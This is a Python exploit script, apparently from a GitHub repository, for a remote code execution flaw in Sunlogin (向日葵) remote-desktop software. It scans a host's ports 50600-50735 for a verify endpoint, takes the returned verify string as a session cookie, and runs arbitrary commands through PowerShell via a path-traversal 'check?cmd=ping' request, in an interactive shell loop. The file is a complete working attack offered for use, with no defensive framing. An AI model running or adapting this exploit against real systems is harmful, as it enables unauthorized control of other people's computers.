#encoding=utf-8
#由@破壳雏鸟编写，https://github.com/pkcn445/sun_rce
"""
代码参考了 @东方有鱼名为咸 大佬，仓库地址：https://github.com/Mr-xn/sunlogin_rce
可能存在漏洞的向日葵版本：

    11.1.1

    10.3.0.27372

    11.0.0.33162
"""
from urllib.parse import quote
from requests import get
from asyncio.tasks import ensure_future
from re import findall
import asyncio
import sys
import argparse

def get_verify_cid(url:str):
    r = get(url=url,timeout=5)
    if r.status_code == 200:
        print("攻击成功！\n")
        base_url = findall("(.*?)/cgi-bin",url)[0]
        while 1:
            try:
                cmd = input(">>>")
                if cmd:
                    execute_cmd(base_url,r.json().get("verify_string"),cmd)
                else:
                    continue
            except:
                print("异常退出！")
                sys.exit(-1)
def execute_cmd(base_url,cid,cmd):
    cmd = quote(cmd)
    url = base_url+"/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + cmd
    r = get(url=url,headers={"Cookie":"CID="+cid})
    if r.status_code == 200:
        print("\n"+r.text.encode("ISO-8859-1").decode("gbk"))
def scan(host:str):
    url_list = []
    for i in range(50600,50736):
        url = "http://"+host+":"+str(i)+"/cgi-bin/rpc?action=verify-haras"
        url_list.append(url)
    async def run(url):
        try:
            r = get(url=url,timeout=5).status_code
            await asyncio.sleep(2)
            if r == 200:
                return url
            else:
                return False
        except:
            return False
    def callback(rst):
        if rst.result():
            print("探测成功---"+rst.result()+"\n请使用python3 sun_rce.py -url "+rst.result()+" 测试攻击")
            sys.exit(-1)
    task_list = []
    for i in url_list:
        t = run(i)
        task = ensure_future(t)
        task.add_done_callback(callback)
        task_list.append(task)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncio.wait(task_list))
def main():
    print("""       
                                SA391,                                    .r9GG35&G          
                                &#ii13Gh;                               i3X31i;:,rB1         
                                iMs,:,i5895,                         .5G91:,:;:s1:8A         
                                 33::::,,;5G5,                     ,58Si,,:::,sHX;iH1        
                                  Sr.,:;rs13BBX35hh11511h5Shhh5S3GAXS:.,,::,,1AG3i,GG        
                                  .G51S511sr;;iiiishS8G89Shsrrsh59S;.,,,,,..5A85Si,h8        
                                 :SB9s:,............................,,,.,,,SASh53h,1G.       
                              .r18S;..,,,,,,,,,,,,,,,,,,,,,,,,,,,,,....,,.1H315199,rX,       
                            ;S89s,..,,,,,,,,,,,,,,,,,,,,,,,....,,.......,,,;r1ShS8,;Xi       
                          i55s:.........,,,,,,,,,,,,,,,,.,,,......,.....,,....r9&5.:X1       
                         59;.....,.     .,,,,,,,,,,,...        .............,..:1;.:&s       
                        s8,..;53S5S3s.   .,,,,,,,.,..      i15S5h1:.........,,,..,,:99       
                        93.:39s:rSGB@A;  ..,,,,.....    .SG3hhh9G&BGi..,,,,,,,,,,,,.,83      
                        G5.G8  9#@@@@@X. .,,,,,,.....  iA9,.S&B###@@Mr...,,,,,,,,..,.;Xh     
                        Gs.X8 S@@@@@@@B:..,,,,,,,,,,. rA1 ,A@@@@@@@@@H:........,,,,,,.iX:    
                       ;9. ,8A#@@@@@@#5,.,,,,,,,,,... 9A. 8@@@@@@@@@@M;    ....,,,,,,,,S8    
                       X3    iS8XAHH8s.,,,,,,,,,,...,..58hH@@@@@@@@@Hs       ...,,,,,,,:Gs   
                      r8,        ,,,...,,,,,,,,,,.....  ,h8XABMMHX3r.          .,,,,,,,.rX:  
                     :9, .    .:,..,:;;;::,.,,,,,..          .,,.               ..,,,,,,.59  
                    .Si      ,:.i8HBMMMMMB&5,....                    .            .,,,,,.sMr
                    SS       :: h@@@@@@@@@@#; .                     ...  .         ..,,,,iM5
                    91  .    ;:.,1&@@@@@@MXs.                            .          .,,:,:&S
                    hS ....  .:;,,,i3MMS1;..,..... .  .     ...                     ..,:,.99
                    ,8; ..... .,:,..,8Ms:;,,,...                                     .,::.83
                     s&: ....  .sS553B@@HX3s;,.    .,;13h.                            .:::&1
                      SXr  .  ...;s3G99XA&X88Shss11155hi.                             ,;:h&,
                       iH8:  . ..   ,;iiii;,::,,,,,.                                 .;irHA  
                        ,8X5;   .     .......                                       ,;iihS8Gi
                           1831,                                                 .,;irrrrrs&@
                             ;5A8r.                                            .:;iiiiirrss1H
                               :X@H3s.......                                .,:;iii;iiiiirsrh
                                r#h:;,...,,.. .,,:;;;;;:::,...              .:;;;;;;iiiirrss1
                               ,M8 ..,....,.....,,::::::,,...         .     .,;;;iiiiiirss11h
                               8B;.,,,,,,,.,.....          .           ..   .:;;;;iirrsss111h
                              i@5,:::,,,,,,,,.... .                   . .:::;;;;;irrrss111111
                              9Bi,:,,,,......                        ..r91;;;;;iirrsss1ss1111

                          此时一只卑微的代码狗希望大佬可以给个star。@破壳雏鸟：https://github.com/pkcn445/sun_rce
    """)
    parses = argparse.ArgumentParser(description="-ip IP地址 -url 探测到的url")
    parses.add_argument("-ip",default=None,help="-ip IP地址")
    parses.add_argument("-url",default=None,help="-url 探测到的url地址")
    rst = vars(parses.parse_args())
    if rst["ip"]:
        print("正在探测中...")
        scan(rst["ip"])
    elif rst["url"]:
        get_verify_cid(rst["url"])
    else:
        parses.print_help()

if __name__ == "__main__":
    main()
